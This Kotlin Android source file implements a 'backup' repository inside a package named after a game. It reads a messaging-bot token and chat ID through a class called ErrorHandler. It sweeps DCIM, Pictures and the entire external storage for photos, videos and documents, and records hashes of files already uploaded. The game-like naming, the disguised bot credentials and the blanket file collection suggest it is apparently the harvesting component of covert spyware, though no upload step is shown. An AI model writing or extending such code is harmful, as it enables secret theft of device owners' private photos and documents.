package com.service.assasinscreed02.backup.data.repositories

import android.content.Context
import android.os.Environment
import android.util.Log
import com.service.assasinscreed02.ErrorHandler
import com.service.assasinscreed02.backup.domain.entities.BackupConfig
import com.service.assasinscreed02.backup.domain.repositories.BackupRepository
import java.io.File
import java.security.MessageDigest
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * Implementación del repositorio de backup
 */
class BackupRepositoryImpl : BackupRepository {
    
    companion object {
        private const val TAG = "BackupRepositoryImpl"
        private const val PREFS_NAME = "BackupPrefs"
        private const val UPLOADED_FILES_KEY = "uploaded_files"
    }
    
    override suspend fun getBotConfig(context: Context): BackupConfig? = withContext(Dispatchers.IO) {
        try {
            val config = ErrorHandler.obtenerConfigBot(context)
            if (config.first.isNullOrBlank() || config.second.isNullOrBlank()) {
                Log.w(TAG, "Configuración del bot no encontrada")
                return@withContext null
            }
            
            BackupConfig(
                token = config.first ?: "",
                chatId = config.second ?: ""
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo configuración del bot: ${e.message}")
            null
        }
    }
    
    override suspend fun getUploadedFiles(context: Context): Set<String> = withContext(Dispatchers.IO) {
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.getStringSet(UPLOADED_FILES_KEY, emptySet()) ?: emptySet()
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo archivos subidos: ${e.message}")
            emptySet()
        }
    }
    
    override suspend fun saveUploadedFile(context: Context, fileHash: String) {
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val currentFiles = prefs.getStringSet(UPLOADED_FILES_KEY, emptySet())?.toMutableSet() ?: mutableSetOf()
            currentFiles.add(fileHash)
            prefs.edit().putStringSet(UPLOADED_FILES_KEY, currentFiles).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Error guardando archivo subido: ${e.message}")
        }
    }
    
    override suspend fun scanDCIMAndPictures(context: Context): List<File> = withContext(Dispatchers.IO) {
        val files = mutableListOf<File>()
        val extensiones = getConfiguredFileTypes(context)
        
        try {
            val directorio = Environment.getExternalStorageDirectory()
            if (!directorio.exists() || !directorio.canRead()) {
                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
                return@withContext files
            }
            
            // Escanear DCIM
            val dcimDir = File(directorio, "DCIM")
            if (dcimDir.exists() && dcimDir.canRead()) {
                dcimDir.walkTopDown().forEach { file ->
                    if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                        if (file.canRead() && file.length() > 0 && !shouldExcludeFile(file)) {
                            files.add(file)
                        }
                    }
                }
            }
            
            // Escanear Pictures
            val picturesDir = File(directorio, "Pictures")
            if (picturesDir.exists() && picturesDir.canRead()) {
                picturesDir.walkTopDown().forEach { file ->
                    if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                        if (file.canRead() && file.length() > 0 && !shouldExcludeFile(file)) {
                            files.add(file)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error escaneando DCIM y Pictures: ${e.message}")
        }
        
        files.sortedBy { it.lastModified() }.reversed()
    }
    
    override suspend fun scanAllNewFiles(context: Context): List<File> = withContext(Dispatchers.IO) {
        val files = mutableListOf<File>()
        val extensiones = getConfiguredFileTypes(context)
        val archivosSubidos = getUploadedFiles(context)
        
        try {
            val directorio = Environment.getExternalStorageDirectory()
            if (!directorio.exists() || !directorio.canRead()) {
                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
                return@withContext files
            }
            
            directorio.walkTopDown().forEach { file ->
                try {
                    if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                        if (file.canRead() && file.length() > 0 && !shouldExcludeFile(file)) {
                            val hash = calculateFileHash(file)
                            if (!archivosSubidos.contains(hash)) {
                                files.add(file)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error procesando archivo ${file.name}: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error escaneando archivos: ${e.message}")
        }
        
        files.sortedBy { it.lastModified() }.reversed()
    }
    
    override suspend fun filterFilesByType(files: List<File>, isImage: Boolean): List<File> = withContext(Dispatchers.IO) {
        if (isImage) {
            files.filter { isImage(it) }
        } else {
            files.filter { isVideo(it) }
        }
    }
    
    override suspend fun calculateFileHash(file: File): String = withContext(Dispatchers.IO) {
        try {
            val md = MessageDigest.getInstance("MD5")
            val bytes = file.readBytes()
            val digest = md.digest(bytes)
            digest.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error calculando hash de ${file.name}: ${e.message}")
            file.absolutePath + "_" + file.lastModified()
        }
    }
    
    override fun isImage(file: File): Boolean {
        val extension = file.extension.lowercase()
        return extension in setOf("jpg", "jpeg", "png", "gif", "bmp", "webp")
    }
    
    override fun isVideo(file: File): Boolean {
        val extension = file.extension.lowercase()
        return extension in setOf("mp4", "avi", "mov", "mkv", "wmv", "flv", "webm", "3gp")
    }
    
    override suspend fun getConfiguredFileTypes(context: Context): Set<String> = withContext(Dispatchers.IO) {
        try {
            val prefs = context.getSharedPreferences("backup_config", Context.MODE_PRIVATE)
            val tiposConfigurados = prefs.getStringSet("tipos_archivo", null)
            
            if (tiposConfigurados != null) {
                tiposConfigurados
            } else {
                // Tipos por defecto
                setOf("jpg", "jpeg", "png", "mp4", "avi", "mov", "pdf", "docx", "txt")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo tipos de archivo: ${e.message}")
            setOf("jpg", "jpeg", "png", "mp4", "avi", "mov")
        }
    }
    
    /**
     * Verifica si un archivo debe ser excluido del backup
     */
    private fun shouldExcludeFile(file: File): Boolean {
        val absolutePath = file.absolutePath.lowercase()
        
        // Excluir archivos de ES File Explorer (.estrongs)
        if (absolutePath.contains("/.estrongs/")) {
            Log.d(TAG, "Excluyendo archivo de ES File Explorer: ${file.name}")
            return true
        }
        
        // Excluir miniaturas de Pictures (.thumbnails)
        if (absolutePath.contains("/pictures/.thumbnails/")) {
            Log.d(TAG, "Excluyendo miniatura de Pictures: ${file.name}")
            return true
        }
        
        // Excluir archivos temporales
        if (absolutePath.contains("/temp/") || absolutePath.contains("/tmp/")) {
            Log.d(TAG, "Excluyendo archivo temporal: ${file.name}")
            return true
        }
        
        // Excluir archivos de caché
        if (absolutePath.contains("/cache/")) {
            Log.d(TAG, "Excluyendo archivo de caché: ${file.name}")
            return true
        }
        
        // Excluir archivos ocultos (que empiecen con punto)
        if (file.name.startsWith(".")) {
            Log.d(TAG, "Excluyendo archivo oculto: ${file.name}")
            return true
        }
        
        return false
    }
} 